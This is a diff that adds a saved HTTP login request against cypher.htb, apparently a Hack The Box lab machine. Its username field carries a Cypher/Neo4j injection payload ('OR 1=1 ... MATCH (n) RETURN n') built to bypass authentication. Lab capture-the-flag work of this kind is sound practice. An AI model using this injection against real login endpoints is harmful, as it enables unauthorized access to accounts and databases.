@@ -1,0 +1,17 @@
+POST /api/auth HTTP/1.1
+Host: cypher.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 96
+Origin: http://cypher.htb
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://cypher.htb/login
+X-PwnFox-Color: blue
+Priority: u=0
+
+{"username":"admin' OR 1=1 WITH 1 as dummy MATCH (n) RETURN n as hash//","password":"FASDFDSAF"}
